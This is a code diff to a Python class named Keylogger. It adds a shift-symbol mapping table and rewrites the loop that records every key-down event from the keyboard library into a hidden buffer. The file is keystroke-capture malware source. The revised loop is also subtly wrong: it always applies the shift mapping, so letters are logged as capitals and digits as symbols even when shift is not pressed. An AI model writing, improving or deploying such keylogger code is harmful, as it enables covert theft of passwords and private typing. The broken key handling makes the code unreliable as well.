@@ -12,12 +12,62 @@ import time
 TRANSLATION_TABLE = {
         "space":" ",
         "ctrl":"'CTRL'",
-        "shift":"'SHIFT",
-        "tab":"'TAB'",
-        "enter":"'ENTER'",
+        "tab":"\t",
+        "enter":"\n",
         "backspace":"\b",
         "alt":"'ALT'"
-    }
+}
+
+
+SHIFT_MODIFIER_TABLE = {
+    "a":"A",
+    "b":"B",
+    "c":"C",
+    "d":"D",
+    "e":"E",
+    "f":"F",
+    "g":"G",
+    "h":"H",
+    "i":"I",
+    "j":"J",
+    "k":"K",
+    "l":"L",
+    "m":"M",
+    "n":"N",
+    "o":"O",
+    "p":"P",
+    "q":"Q",
+    "r":"R",
+    "s":"S",
+    "t":"T",
+    "u":"U",
+    "v":"V",
+    "w":"W",
+    "x":"X",
+    "y":"Y",
+    "z":"Z",
+    "1":"!",
+    "2":"@",
+    "3":"#",
+    "4":"$",
+    "5":"%",
+    "6":"^",
+    "7":"&",
+    "8":"*",
+    "9":"(",
+    "0":")",
+    "-":"_",
+    "=":"+",
+    "[":"{",
+    "]":"}",
+    "\\":"|",
+    ";":":",
+    "'":"\"",
+    ",":"<",
+    ".":">",
+    "/":"?",
+    "`":"~"
+}
 
 
 class Keylogger:
@@ -51,15 +101,23 @@ class Keylogger:
         while not self.__stop:
             event = keyboard.read_event()
             if event.event_type == "down":
-                try:
-                    temp = TRANSLATION_TABLE[event.name]
+                if event.name == "shift":
+                    continue
+                elif event.name in TRANSLATION_TABLE.keys():
                     self.__lock.acquire()
-                    self.__keylog += temp
+                    self.__keylog += TRANSLATION_TABLE[event.name]
                     self.__lock.release()
-                except KeyError:
+                    continue
+                elif event.name in SHIFT_MODIFIER_TABLE.keys():
+                    self.__lock.acquire()
+                    self.__keylog += SHIFT_MODIFIER_TABLE[event.name]
+                    self.__lock.release()
+                    continue
+                else:
                     self.__lock.acquire()
                     self.__keylog += event.name
                     self.__lock.release()
+                    continue
         self.__active = False
 
 
